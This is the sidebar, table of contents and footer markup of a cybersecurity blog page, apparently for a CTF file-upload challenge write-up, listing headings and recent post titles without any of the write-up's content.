class="social-icon" href="https://www.linkedin.com/in/phat-mai-hong-2580a52aa/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #0A66C2;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Blog about cybersecurity, hacking, pentesting, red teaming and more...</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CyberCon-2025-SafeUpload-Web-Challenge"><span class="toc-number">1.</span> <span class="toc-text">CyberCon 2025 SafeUpload Web Challenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tong-quan-challenge"><span class="toc-number">1.1.</span> <span class="toc-text">Tổng quan challenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phan-tich-source-code"><span class="toc-number">1.2.</span> <span class="toc-text">Phân tích source code</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Debug-va-POC"><span class="toc-number">1.2.1.</span> <span class="toc-text">Debug và POC</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/27/2026-01-27-CVE-2025-14770/" title="CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter">CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter</a><time datetime="2026-01-27T14:19:14.489Z" title="Created 2026-01-27 21:19:14">2026-01-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/2026-01-21-Ysoserial-CC3-Analyst/" title="Ysoserial Common Collections 3 Analyst (CC3)">Ysoserial Common Collections 3 Analyst (CC3)</a><time datetime="2026-01-21T05:35:18.206Z" title="Created 2026-01-21 12:35:18">2026-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/31/2025-12-31-SSTI-Velocity/" title="Velocity Server Side Template Injection Challenge">Velocity Server Side Template Injection Challenge</a><time datetime="2025-12-31T04:43:06.549Z" title="Created 2025-12-31 11:43:06">2025-12-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/25/2025-12-25-CBJS-Misconfiguration/" title="CBJS Java Misconfiguration Challenge">CBJS Java Misconfiguration Challenge</a><time datetime="2025-12-25T13:30:27.815Z" title="Created 2025-12-25 20:30:27">2025-12-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/05/2025-12-05-TryHackMe-Hammer/" title="Tryhackme Hammer challenge WriteUp">Tryhackme Hammer challenge WriteUp</a><time datetime="2025-12-04T18:19:12.763Z" title="Created 2025-12-05 01:19:12">2025-12-05</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Phat Mai</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>